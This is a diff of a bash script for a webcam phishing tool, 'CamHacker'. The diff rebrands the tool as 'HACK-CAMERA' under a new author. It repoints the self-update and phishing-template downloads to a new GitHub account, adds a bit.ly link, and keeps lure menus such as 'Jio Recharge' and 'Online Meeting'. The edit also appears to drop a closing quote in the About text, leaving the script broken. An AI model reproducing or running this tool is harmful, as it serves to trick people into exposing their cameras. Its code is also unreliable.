@@ -53,27 +53,26 @@ white="\033[0;37m"
 nc="\033[00m"
 
 # Output snippets
-info="${cyan}[${white}+${cyan}] ${yellow}"
+info="${red}[${white}+${red}] ${cyan}"
 info2="${blue}[${white}•${blue}] ${yellow}"
-ask="${green}[${white}?${green}] ${purple}"
+ask="${red}[${white}?${red}] ${purple}"
 error="${yellow}[${white}!${yellow}] ${red}"
-success="${cyan}[${white}√${cyan}] ${green}"
+success="${red}[${white}√${red}] ${green}"
 
 
 
-version="1.3"
+version="1.5"
 
 cwd=`pwd`
 
 # Logo
 logo="
-${green}  ____                _   _            _
-${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
-${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
-${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
-${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
+${green} _  _   _   ___ _  __    ___   _   __  __ ___ ___    _
+${cyan} | || | /_\ / __| |/ /__ / __| /_\ |  \/  | __| _ \  /_\
+${red} | __ |/ _ \ (__| ' <___| (__ / _ \| |\/| | _||   / / _ \
+${purple} |_||_/_/ \_\___|_|\_\   \___/_/ \_\_|  |_|___|_|_\/_/ \_\                
 ${red}                                            [v${version}]
-${blue}                                    [By KasRoudra]
+${blue}       [By XPHANTOM (PH4N70M) KasRoudra]
 "
 
 # Package Installer
@@ -426,14 +425,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
-    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
+    changelog=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/changelog.log`
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -441,8 +440,8 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
-            echo -e "\n${success}CamHacker updated successfully!!"
+            cd .. && rm -rf HACK-CAMERA hack_camera && git clone https://github.com/XPH4N70M/HACK-CAMERA 
+            echo -e "\n${success}HACK-CAMERA updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
             echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
             fi
@@ -476,16 +475,16 @@ echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
 
-${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
-${cyan}[${white}2${cyan}] ${yellow}Festival
-${cyan}[${white}3${cyan}] ${yellow}Live Youtube
-${cyan}[${white}4${cyan}] ${yellow}Online Meeting
-${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
-${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
-${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
-${cyan}[${white}x${cyan}] ${yellow}About
-${cyan}[${white}m${cyan}] ${yellow}More tools
-${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
+${red}[${white}1${red}] ${cyan}Jio Recharge
+${red}[${white}2${red}] ${cyan}Festival
+${red}[${white}3${red}] ${cyan}Live Youtube
+${red}[${white}4${red}] ${cyan}Online Meeting
+${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
+${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
+${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
+${red}[${white}x${red}] ${cyan}About
+${red}[${white}m${red}] ${cyan}More tools
+${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 sleep 1
 if [ -z $OPTION ]; then
@@ -562,14 +561,13 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra]
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
+$red[Github]     ${cyan} :[https://github.com/XPH4N70M]
+$red[Join Us]  ${cyan} :[https://bit.ly/3LAy80f]
         printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
+        xdg-open "https://github.com/XPH4N70M/XPH4N70M#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -588,7 +586,7 @@ if ! [ -d $dir ]; then
     mkdir $dir
     cd $dir
     netcheck
-    wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/${dir}.zip"
+    wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/${dir}.zip"
     unzip ${dir}.zip > /dev/null 2>&1
     rm -rf ${dir}.zip
 else
